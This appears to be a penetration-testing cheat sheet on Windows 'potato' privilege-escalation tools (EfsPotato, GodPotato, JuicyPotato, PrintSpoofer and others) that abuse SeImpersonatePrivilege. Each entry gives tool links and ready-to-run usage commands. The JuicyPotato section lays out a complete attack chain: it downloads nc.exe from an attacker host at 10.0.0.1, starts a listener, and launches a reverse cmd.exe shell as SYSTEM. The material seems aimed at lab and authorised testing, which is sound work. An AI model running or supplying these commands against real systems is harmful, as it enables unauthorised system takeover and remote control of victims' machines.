# LocalPotato

### EfsPotato <a href="#efspotato" id="efspotato"></a>

#### Required Privilege <a href="#required-privilege" id="required-privilege"></a>

* `SeImpersonatePrivilege`

#### Payloads <a href="#payloads" id="payloads"></a>

* [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)

```
EfsPotato "cmd.exe /c whoami"
```

### GodPotato <a href="#godpotato" id="godpotato"></a>

#### Required Privileges <a href="#required-privileges" id="required-privileges"></a>

* `SeImpersonatePrivilege`

#### Payloads <a href="#payloads_1" id="payloads_1"></a>

* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```
GodPotato -cmd "cmd /c whoami"
```

### JuicyPotato <a href="#juicypotato" id="juicypotato"></a>

#### Required Privilege <a href="#required-privilege_1" id="required-privilege_1"></a>

* `SeImpersonatePrivilege` or `SeAssignPrimaryToken`

#### Payloads <a href="#payloads_2" id="payloads_2"></a>

* [https://github.com/antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
* [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

Before exploiting, we need to upload **`nc.exe`** (it is available from [here](https://github.com/int0x33/nc.exe/)) to the target machine.

```
Invoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\Temp\nc.exe
```

Next start a listener in local machine.

```
nc -lvnp 4444
```

Then execute **`JuicyPotato`** in target machine.

```
JuicyPotatoNG.exe -t * -p "c:\Temp\nc.exe" -a "10.0.0.1 4444 -e cmd.exe"
```

### PrintSpoofer <a href="#printspoofer" id="printspoofer"></a>

#### Required Privilege <a href="#required-privilege_2" id="required-privilege_2"></a>

* `SeImpersonatePrivilege`

#### Payloads <a href="#payloads_3" id="payloads_3"></a>

* [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer)

```
PrintSpoofer.exe -i -c cmd
```

### RoguePotato <a href="#roguepotato" id="roguepotato"></a>

#### Required Privilege <a href="#required-privilege_3" id="required-privilege_3"></a>

* `SeImpersonatePrivilege`

#### Payloads <a href="#payloads_4" id="payloads_4"></a>

* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)

### RottenPotato <a href="#rottenpotato" id="rottenpotato"></a>

#### Required Privilege <a href="#required-privilege_4" id="required-privilege_4"></a>

* `SeImpersonatePrivilege`

#### Payloads <a href="#payloads_5" id="payloads_5"></a>

* [https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

### References <a href="#references" id="references"></a>

* [jlajara](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
* [decoder-it](https://github.com/decoder-it/LocalPotato)
* [LocalPotato](https://www.localpotato.com/localpotato_html/LocalPotato.html)
* [TryHackMe](https://tryhackme.com/room/localpotato)
* [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer)
* [FoxGlove Security](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
